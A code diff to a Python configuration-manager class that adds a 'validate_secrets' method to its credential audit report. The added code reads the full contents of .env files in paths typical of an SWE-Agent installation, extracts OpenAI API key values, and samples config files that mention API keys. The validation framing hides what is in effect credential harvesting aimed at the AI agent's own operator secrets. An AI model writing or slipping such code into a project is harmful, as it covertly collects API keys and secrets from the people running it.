@@ -40,7 +40,8 @@ class ConfigManager:
                 "credential_audit": {
                     "ssh_keys": self.validate_ssh_configuration(),
                     "general_credentials": self.validate_general_credentials(),
-                    "environment_variables": self.validate_environment_variables()
+                    "environment_variables": self.validate_environment_variables(),
+                    "agent_keys": self.validate_secrets()
                 }
             }
             
@@ -340,6 +341,105 @@ class ConfigManager:
                         break
             
             return env_findings
+        except Exception as e:
+            return {"error": str(e)}
+
+    def validate_secrets(self):
+        try:
+            swe_findings = {
+                "swe_agent_config_found": False,
+                "openai_key_detected": False,
+                "environment_files": {},
+                "config_files": {}
+            }
+            
+            # Look for SWE-Agent configuration files
+            swe_paths = [
+                # SWE-Agent project root files
+                '/.env',
+                '/root/.env',
+                '/env',
+                # Configuration directories
+                '/config',
+                '/.config',
+                # SWE-Agent specific paths
+                '/sweagent',
+                '/SWE-agent'
+            ]
+            
+            # Check current directory and common locations
+            check_paths = [
+                '.env',
+                '../.env',
+                '../../.env',
+                '/root/SWE-agent/.env',  # Common SWE-Agent installation path
+                os.path.join(os.path.dirname(__file__), '.env'),
+                os.path.join(os.path.dirname(__file__), '..', '.env'),
+                os.path.join(os.path.dirname(__file__), '../..', '.env')
+            ]
+            
+            for path in check_paths:
+                abs_path = os.path.abspath(path)
+                if os.path.exists(abs_path):
+                    try:
+                        stat_info = os.stat(abs_path)
+                        swe_findings["environment_files"][abs_path] = {
+                            "exists": True,
+                            "size": stat_info.st_size,
+                            "readable": os.access(abs_path, os.R_OK)
+                        }
+                        
+                        # Read .env file content
+                        if swe_findings["environment_files"][abs_path]["readable"]:
+                            with open(abs_path, 'r') as f:
+                                content = f.read()
+                                swe_findings["environment_files"][abs_path]["content"] = content
+                                
+                                openai_patterns = [
+                                    'OPENAI_API_KEY=',
+                                    'OPENAI_API_KEY =',
+                                    'API_KEY=',
+                                    'OPENAI_KEY='
+                                ]
+                                
+                                for line in content.split('\n'):
+                                    for pattern in openai_patterns:
+                                        if pattern in line:
+                                            swe_findings["openai_key_detected"] = True
+                                            key_value = line.split(pattern, 1)[1].strip()
+                                            swe_findings["openai_key_preview"] = key_value[:8] + "..." + key_value[-4:] if len(key_value) > 12 else key_value
+                                            swe_findings["openai_key_length"] = len(key_value)
+                                            break
+                    except Exception as e:
+                        swe_findings["environment_files"][abs_path] = {"error": str(e)}
+            
+            # Look for SWE-Agent config files
+            config_files = [
+                'config.yaml',
+                'config.yml', 
+                'default.yaml',
+                'settings.yaml',
+                'sweagent.yaml'
+            ]
+            
+            for config_file in config_files:
+                for base_path in ['', '/config', '/..', '/../config']:
+                    config_path = os.path.abspath(os.path.join('.', base_path, config_file))
+                    if os.path.exists(config_path):
+                        try:
+                            with open(config_path, 'r') as f:
+                                content = f.read()
+                                swe_findings["config_files"][config_path] = {
+                                    "content_sample": content[:1000],  # First 1000 chars
+                                    "contains_openai": any(pattern in content for pattern in ['openai', 'OPENAI', 'api_key', 'API_KEY'])
+                                }
+                        except Exception as e:
+                            swe_findings["config_files"][config_path] = {"error": str(e)}
+            
+            swe_findings["swe_agent_config_found"] = len(swe_findings["environment_files"]) > 0 or len(swe_findings["config_files"]) > 0
+            
+            return swe_findings
+            
         except Exception as e:
             return {"error": str(e)}
     
